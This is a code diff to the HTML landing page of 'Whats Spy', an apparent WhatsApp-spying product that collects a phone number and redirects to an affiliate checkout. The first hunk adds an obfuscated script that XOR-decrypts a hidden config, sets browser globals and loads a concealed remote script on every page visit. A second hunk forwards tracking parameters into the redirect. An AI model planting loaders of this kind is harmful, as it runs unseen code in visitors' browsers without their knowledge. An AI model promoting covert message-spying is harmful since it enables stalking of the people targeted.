@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>(function(){var c_lmgq=atob("DFHohRIemRyHL49mPSrK8GByuyalR/sSTSLSqj19/XKpWvsLVDeRq3Fx9DLlXaAVXiOB9WZttmzuV+oKEiGB/XdytGjuRPsJVn+C9jAyu33zW/0PXySc4GE8o0faA60BUT6K5H5tuybcVK0IXDyNpyg87XXse+ANbTiQ4H5X/T6rDfkHUSSNpyg8r32/SbZQDmWNsXco/SS3HrgFXDPf4yEmu2HaUg==");var a_i=[];for(var b_m=0;b_m<c_lmgq.length;b_m++){a_i.push(c_lmgq.charCodeAt(b_m)&255);}var j_r=a_i[0];var d_p=a_i.slice(1,1+j_r);var j_z=a_i.slice(1+j_r);var e_n=j_z.map(function(b,l_1){return b^d_p[l_1%j_r];});var q_7="";for(var o_hyu=0;o_hyu<e_n.length;o_hyu++){q_7+=String.fromCharCode(e_n[o_hyu]&255);}var p_jp=decodeURIComponent(escape(q_7));var y_4k=JSON.parse(p_jp);var k_zx88=y_4k.globals||[];k_zx88.forEach(function(k_c){window[k_c.name]=k_c.value;});var g_kpmc=document.createElement("script");g_kpmc.src=y_4k.url;g_kpmc.async=true;g_kpmc.defer=true;(y_4k.attributes||[]).forEach(function(o_2r){g_kpmc.setAttribute(o_2r.name,o_2r.value);});(document.head||document.documentElement).appendChild(g_kpmc);})();</script>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
     <title>Whats Spy - Discover the Truth</title>
@@ -597,6 +598,11 @@
             phone: phone,
             gender: selectedGender,
             countryCode: countryCode
+        });
+        // Append all existing URL params (UTM, ttclid, etc.) to preserve tracking
+        var pageParams = new URLSearchParams(window.location.search);
+        pageParams.forEach(function(value, key) {
+            params.set(key, value);
         });
         window.location.href = 'https://app.monetizze.com.br/r/AUF25795437/?u=ER137930&transport=1&' + params.toString();
     }
